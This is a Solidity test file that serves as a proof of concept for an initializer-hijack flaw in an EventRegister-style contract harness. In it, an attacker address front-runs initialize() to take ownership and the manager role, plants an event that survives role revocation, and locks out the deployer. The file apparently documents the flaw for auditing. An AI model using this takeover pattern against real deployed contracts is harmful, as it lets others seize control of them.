// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {
    EventRegisterLike,
    IEventRegisterLike
} from "../src/TaikoF2EventRegisterInitHijackHarness.sol";

interface Vm {
    function prank(address msgSender) external;
}

/// @notice Deterministic witness tests for EventRegister deploy/init split takeover.
contract TaikoF2EventRegisterInitHijackTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    bytes32 private constant DEFAULT_ADMIN_ROLE = bytes32(0);
    bytes32 private constant EVENT_MANAGER_ROLE = keccak256("EVENT_MANAGER_ROLE");

    function test_attacker_first_initialize_captures_owner_and_manager_role() public {
        address deployer = address(0xA11CE);
        address attacker = address(0xBEEF);

        vm.prank(deployer);
        EventRegisterLike register = new EventRegisterLike();

        vm.prank(attacker);
        register.initialize();

        require(
            register.hasRole(DEFAULT_ADMIN_ROLE, deployer),
            "deployer should still hold default admin role"
        );
        require(register.owner() == attacker, "attacker should become owner");
        require(
            register.hasRole(EVENT_MANAGER_ROLE, attacker),
            "attacker should gain event manager role"
        );
    }

    function test_attacker_can_poison_event_state_before_admin_recovery() public {
        address deployer = address(0xA11CE);
        address attacker = address(0xBEEF);

        vm.prank(deployer);
        EventRegisterLike register = new EventRegisterLike();

        vm.prank(attacker);
        register.initialize();

        vm.prank(attacker);
        register.createEvent("malicious-event");
        require(register.eventExists(0), "attacker should create event 0");

        vm.prank(deployer);
        register.revokeEventManagerRole(attacker);
        require(
            !register.hasRole(EVENT_MANAGER_ROLE, attacker),
            "deployer can revoke attacker role after compromise"
        );
        require(
            register.eventExists(0),
            "compromised event state remains after role revocation"
        );
    }

    function test_legitimate_initialize_call_is_locked_out_after_attacker_first_call()
        public
    {
        address deployer = address(0xA11CE);
        address attacker = address(0xBEEF);

        vm.prank(deployer);
        EventRegisterLike register = new EventRegisterLike();

        vm.prank(attacker);
        register.initialize();

        vm.prank(deployer);
        (bool ok,) = address(register).call(
            abi.encodeWithSelector(IEventRegisterLike.initialize.selector)
        );
        require(!ok, "legitimate initialize call should revert");
        require(register.owner() == attacker, "attacker ownership should persist");
    }
}
